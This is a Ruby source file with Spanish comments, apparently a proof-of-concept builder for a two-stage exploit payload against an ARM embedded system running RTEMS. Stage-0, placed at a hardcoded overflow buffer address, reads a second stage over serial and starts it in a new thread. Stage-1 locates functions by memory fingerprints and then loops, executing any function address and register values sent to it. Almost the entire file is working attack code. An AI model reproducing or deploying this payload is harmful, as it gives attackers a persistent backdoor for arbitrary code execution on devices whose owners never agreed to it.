=begin

Este payload es el caso clásico de crear un thread de ejecución aparte para no interferir
con la ejecución principal. Se separa en dos etapas:
La etapa-0 lee por serie (único canal disponible) la etapa-1, crea un thread para ejecutarla
y retorna a la ejecución principal.
La etapa-1 recorre la memoria para buscar las funciones que va a necesitar (fingerprints.rb)
y luego se queda esperando a recibir direcciones de funciones a ejecutar junto a sus parámetros,
con el formato:

	[R0, R1, R2, R3, Dir. de la Func.]

=end


require '../src/ruby/MyCustomPayload'


# Datos que quedan hardcodeados y deben ser sabidos de antemano.
normalReturnAddress = 0x8520
safeMemoryAddress = 0x50000 # (bss section)
overflowBufAddress = 0x103c48

nextSafeAddress = safeMemoryAddress # (puntero que va a avanzando sobre la memoria "segura" utilizada)

# Solo por practicidad de este POC también se hardcodean las funciones que utiliza el stage-0
# (readBytes y pthread_create) aunque se podría agregar la lógica para que este stage resuelva estas dos direcciones solo.
pthread_create_address = 0xe244
readBytes_address = 0x83d0

# TODO: Estos valores deben ajustarse cada vez que se modifican los payloads.
stage0Size = 40
stage1Size = 264

# Se calcula el espacio que va a usar el array con las funciones
$functionsAddressArray = nextSafeAddress
nextSafeAddress += $fingerprints.length * 4

# Lo primero que hace el stage 1 es resolver las address de las funciones requeridas, utilizadas por branchToFunc
$stage1 = MyCustomPayload.new(stage1Size) # TODO: HAY QUE AJUSTAR ESTE VALOR CADA VEZ QUE SE MODIFICA EL PAYLOAD
$stage1.address = nextSafeAddress
nextSafeAddress += stage1Size
searchStringAddress = $stage1.stringSearch
ffaAddress = $stage1.findFunctionsAddress # address de la findFunctionsAddress
stage1Start = $stage1.currPC
$stage1.mov32bToReg(R0, searchStringAddress)
$stage1.mov32bToReg(R1, $stage1.addData($findFuncList.pack("<L*").bytes.to_a))
$stage1.mov32bToReg(R2, $functionsAddressArray)
$stage1.mov32bToReg(R3, TEXT_START)
$stage1.mov32bToReg(R4, TEXT_END)
$stage1.bl(ffaAddress)


loopAddress = $stage1.currPC
$stage1.loadStrAddress(R0, "Preparado para ejecutar funcion.")
$stage1.branchToFunc('puts')
$stage1.addInst genMovReg(R0, 100)
$stage1.branchToFunc('rtems_task_wake_after')
# $stage1.addInst genBranch($stage1.currPC, loopAddress, condition = COND_AL, linkBranch = false)

# Se reserva espacio para guardar los datos del RPC (direción de la función y primeros cuatro registros,
# puede ser que no se requieran todos pero por ahora por simplicidad se deja así).
rpcAddress = nextSafeAddress
nextSafeAddress += 5 * 4 # 4 reg (R0-R3) + fAddress
$stage1.mov32bToReg(R0, rpcAddress)
$stage1.branchToFunc('readBytes') # acá se recibe el frame del RPC

# Por las dudas se verifica que haya salido bien (return de readBytes != -1)
$stage1.mov32bToReg(R1, 0xFFFFFFFF)
$stage1.addInst genCmpReg(R0, R1)

# Se copian los datos a los registros correspondiente y ejecuta la función
$stage1.mov32bToReg(R5, rpcAddress)
$stage1.addInst genLoadPostIndexed(R0, R5, 4)
$stage1.addInst genLoadPostIndexed(R1, R5, 4)
$stage1.addInst genLoadPostIndexed(R2, R5, 4)
$stage1.addInst genLoadPostIndexed(R3, R5, 4)
$stage1.addInst genLdrImm(R5, R5, 0)
$stage1.addInst genBranchToReg(R5, condition = COND_NE, linkBranch = true) # Solo va a ejecutar la función si el check anterior dió bien (readBytes != -1)

$stage1.addInst genBranch($stage1.currPC, loopAddress, condition = COND_AL, linkBranch = false)



# STAGE 0: Se resuelve una vez tenga definido el stage 1
$stage0 = MyCustomPayload.new(stage0Size)
$stage0.address = overflowBufAddress

$stage0.saveAllRegisters

# Llamo a readBytes para copiar un futuro stage-1 payload a una zona segura de memoria (ej: bss)
$stage0.mov32bToReg(R0, $stage1.address)
$stage0.bl(readBytes_address)

# pthread_create(&Thread_id_1, 0, ThreadFn, 0);
threadVarAddress = $stage0.addData([0] * 4) # Thread_id_1: sizeof(pthread_t)
$stage0.mov32bToReg(R0, threadVarAddress)
$stage0.mov32bToReg(R1, 0)
$stage0.mov32bToReg(R2, stage1Start)
$stage0.mov32bToReg(R3, 0)
$stage0.bl(pthread_create_address)

$stage0.restoreAllRegisters

$stage0.addInst genBranchToReg(LR_REG) # Porque por ahora llamo al payload con un BLX
# $stage0.addInst genBranch($stage0.currPC, $stage0.fnAddr['payloadRet'], condition = COND_AL, linkBranch = false)

$rpcEnabled = true # solo para señalar que se deben enviar mas datos a parte del payload
